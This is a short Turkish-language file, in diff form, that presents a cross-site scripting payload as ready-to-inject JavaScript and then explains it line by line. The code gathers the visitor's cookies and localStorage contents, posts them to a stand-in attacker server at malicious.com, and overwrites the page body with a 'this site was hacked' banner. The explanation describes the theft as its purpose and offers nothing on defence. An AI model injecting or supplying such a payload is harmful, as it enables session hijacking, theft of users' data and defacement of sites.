@@ -1,0 +1,29 @@
+CROSS SITE SCRIPTING(XSS) SALDIRILARI İÇİN JAVASCRİPT KODU
+// Bu kod, kullanıcının tarayıcısında çalıştırılmak üzere bir web sitesine enjekte edilebilir
+// Bu kod, kullanıcının çerezlerini, yerel depolama verilerini ve diğer hassas bilgileri çalmak için kullanılabilir
+// Bu kod, kullanıcının web sitesiyle olan etkileşimini değiştirmek veya bozmak için de kullanılabilir
+// Bir XMLHttpRequest nesnesi oluştur
+var xhr = new XMLHttpRequest();
+// Bir POST isteği hazırla
+xhr.open("POST", "https://malicious.com/steal_data.php", true);
+// İstek başlıklarını ayarla
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+// Çerezleri, yerel depolama verilerini ve diğer hassas bilgileri topla
+var cookies = document.cookie;
+var localStorageData = JSON.stringify(localStorage);
+var sensitiveData = cookies + localStorageData;
+// İstek gövdesine verileri ekle
+var data = "data=" + encodeURIComponent(sensitiveData);
+// İsteği gönder
+xhr.send(data);
+// Web sitesinin DOM'unu değiştirerek kullanıcının etkileşimini boz
+document.body.innerHTML = "<h1>Bu site saldırıya uğradı!</h1>";
+Bu kodu açıklamaya çalışacağım. Bu kod, bir web sitesine CROSS SITE SCRIPTING(XSS) saldırısı yapmak için yazılmış bir JavaScript kodudur. Bu saldırı, kötü amaçlı bir kodun, kullanıcının tarayıcısında çalıştırılmak üzere bir web sitesine enjekte edilmesi anlamına gelir. Bu kod, kullanıcının çerezlerini, yerel depolama verilerini ve diğer hassas bilgileri çalmak için kullanılabilir. Ayrıca, kullanıcının web sitesiyle olan etkileşimini değiştirmek veya bozmak için de kullanılabilir.
+Bu kodun çalışma mantığı şöyledir:
+- Öncelikle, bir XMLHttpRequest nesnesi oluşturulur. Bu nesne, sunucuyla veri alışverişi yapmak için kullanılır.
+- Sonra, bir POST isteği hazırlanır. Bu istek, https://malicious.com/steal_data.php adresine gönderilecektir. Bu adres, kötü amaçlı bir sunucudur ve kullanıcının verilerini çalmak için kullanılır.
+- Daha sonra, istek başlıkları ayarlanır. Bu başlıklar, isteğin içeriğinin tipini belirtir. Bu durumda, istek gövdesinde, URL kodlanmış bir form verisi olacaktır.
+- Ardından, çerezleri, yerel depolama verilerini ve diğer hassas bilgileri toplanır. Bu veriler, document.cookie ve localStorage nesneleri aracılığıyla elde edilir. Bu veriler, JSON.stringify fonksiyonu ile bir JSON dizgesine dönüştürülür ve birleştirilir.
+- Sonra, istek gövdesine veriler eklenir. Bu veriler, data adlı bir parametre olarak gönderilir. Bu veriler, encodeURIComponent fonksiyonu ile URL kodlanır. Bu fonksiyon, verilerin sunucuya güvenli bir şekilde ulaşmasını sağlar.
+- Son olarak, istek gönderilir. Bu işlem, xhr.send(data) komutu ile yapılır. Bu komut, verileri kötü amaçlı sunucuya iletir.
+Bu kodun son kısmında, web sitesinin DOM'unu değiştirerek kullanıcının etkileşimini bozma işlemi yapılır. DOM, web sayfasının yapısını ve içeriğini temsil eden bir nesne modelidir. Bu kod, document.body.innerHTML özelliğini kullanarak, web sayfasının gövdesini, bir h1 etiketi içinde "Bu site saldırıya uğradı!" yazan bir metinle değiştirir. Bu şekilde, kullanıcı, web sitesinin normal görünümünü göremez ve web sitesiyle etkileşime giremez.
